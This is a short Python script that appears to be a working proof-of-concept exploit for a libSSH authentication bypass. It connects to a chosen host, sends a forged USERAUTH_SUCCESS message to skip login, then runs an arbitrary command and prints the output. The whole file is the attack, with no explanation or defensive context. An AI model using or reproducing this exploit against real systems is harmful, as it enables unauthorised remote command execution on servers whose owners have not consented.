import paramiko
import socket
import argparse
from sys import argv

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--cmd', help='command', default='uname')

args = parser.parse_args()

host = args.host
port = args.port
c = args.cmd

sock = socket.socket()

sock.connect((str(host), int(port)))

message = paramiko.message.Message()
transport = paramiko.transport.Transport(sock)
transport.start_client()

message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
transport._send_message(message)

cmd = transport.open_session(timeout=5)
cmd.exec_command(str(c))

out = cmd.makefile("rb",2048)
output = out.read()
out.close()
print (output)